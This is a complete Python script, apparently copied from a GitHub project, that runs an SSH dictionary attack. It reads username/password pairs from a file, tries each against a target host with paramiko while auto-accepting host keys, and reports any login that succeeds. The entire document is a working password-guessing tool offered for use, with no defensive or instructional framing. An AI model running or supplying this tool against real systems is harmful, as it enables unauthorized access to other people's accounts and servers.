import paramiko
import sys
import socket

# Usage
# python3 attack.py [host_name] [login_file]

# https://github.com/veeral-patel/SSH-Dictionary-Attack

#It takes the target's host name and a file containing 
#usernames and passwords, like this:

# user1 pass1
# user2 pass2
# user3 pass3


if len(sys.argv[1:]) != 2:
    print("Exactly 2 arguments required!")
    sys.exit()

# host = "hive22.cs.berkeley.edu"
host = sys.argv[1]
with open(sys.argv[2], 'r') as file:
    lines = file.readlines()

lines = [line.strip("\n") for line in lines]
lst = [tuple(line.split(" ")) for line in lines]

client = paramiko.SSHClient()

client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

for username, password in lst:
    try:
        client.connect(host, username=username, password=password)
        print("[+] Success! ", username, " / ", password)
        break
    except socket.gaierror:
        print("invalid host!")
        break
    except paramiko.AuthenticationException:
        print("[-] Failure: ", username, "/", password)
